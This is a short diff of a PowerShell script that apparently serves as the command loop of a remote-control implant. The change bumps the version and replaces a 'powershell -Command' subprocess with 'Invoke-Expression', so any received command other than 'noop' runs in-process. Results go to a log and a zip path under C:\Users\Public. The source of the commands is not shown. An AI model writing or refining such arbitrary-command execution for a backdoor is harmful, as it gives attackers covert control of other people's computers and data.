@@ -1,4 +1,4 @@
-## VERSION 1.2
+## VERSION 1.2.1
 
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
@@ -65,7 +65,7 @@ function main {
         if ($cmd -and $cmd -ne "noop") {
             try {
                 # Capture output including errors and noop
-                $output = powershell -Command "$cmd" 2>&1 | Out-String
+                $output = Invoke-Expression $cmd 2>&1 | Out-String
                 $output = ($output -split "`r?`n" | Where-Object { $_.Trim() -ne "" }) -join "`n"
                 $outText = "SUCCESS:`n$output"
                 $outText | Out-File -Append -FilePath $log
